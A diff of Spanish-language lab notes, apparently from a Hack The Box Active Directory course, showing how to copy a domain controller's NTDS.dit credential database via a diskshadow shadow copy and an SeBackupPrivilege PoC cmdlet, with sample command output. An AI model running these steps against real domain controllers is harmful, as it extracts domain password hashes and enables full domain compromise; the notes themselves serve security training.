@@ -121,18 +121,18 @@ Board of Directors:
 
 ## Atacar un Domain Controller — objetivo: NTDS.dit
 
-### Por qué NTDS.dit interesa
+### NTDS.dit 
 
 * Contiene la base de datos de Active Directory con hashes NTLM de cuentas de dominio (usuarios, equipos, krbtgt, etc.).
 * Acceder a este archivo permite extraer credenciales y escalar completamente en el dominio.
 
-### Problema: NTDS.dit está bloqueado en uso
+### NTDS.dit está bloqueado en uso
 
 * El archivo está bloqueado por el sistema mientras AD está funcionando. Solución: crear un **shadow copy** del volumen y exponerlo.
 
 ### Usando DiskShadow para exponer la copia
 
-Ejemplo interactivo con `diskshadow.exe`:
+Utilizamos [`diskshadow.exe`](https://learn.microsoft.com/es-es/windows-server/administration/windows-commands/diskshadow):
 
 ```
 PS C:\htb> diskshadow.exe
@@ -148,16 +148,32 @@ DISKSHADOW> end backup
 DISKSHADOW> exit
 ```
 
-Luego `dir E:\` mostrará la estructura de la copia y el archivo `E:\Windows\NTDS\ntds.dit` será legible.
+Luego `dir E:\` mostrará la estructura de la copia y el archivo `E:\Windows\NTDS\ntds.dit` será legible:
+
+```
+    Directory: E:\
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----         5/6/2021   1:00 PM                Confidential
+d-----        9/15/2018  12:19 AM                PerfLogs
+d-r---        3/24/2021   6:20 PM                Program Files
+d-----        9/15/2018   2:06 AM                Program Files (x86)
+d-----         5/6/2021   1:05 PM                Tools
+d-r---         5/6/2021  12:51 PM                Users
+d-----        3/24/2021   6:38 PM                Windows
+```
 
 ---
 
 ## Copiar NTDS.dit desde la shadow copy
 
-### Con el PoC
+Utilizamos el PoC para omitir la ACL y copiar NTDS.dit localmente:
 
 ```powershell
 PS C:\htb> Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
+Copied 16777216 bytes
 ```
 
 ### Alternativa: usar `robocopy` en modo backup
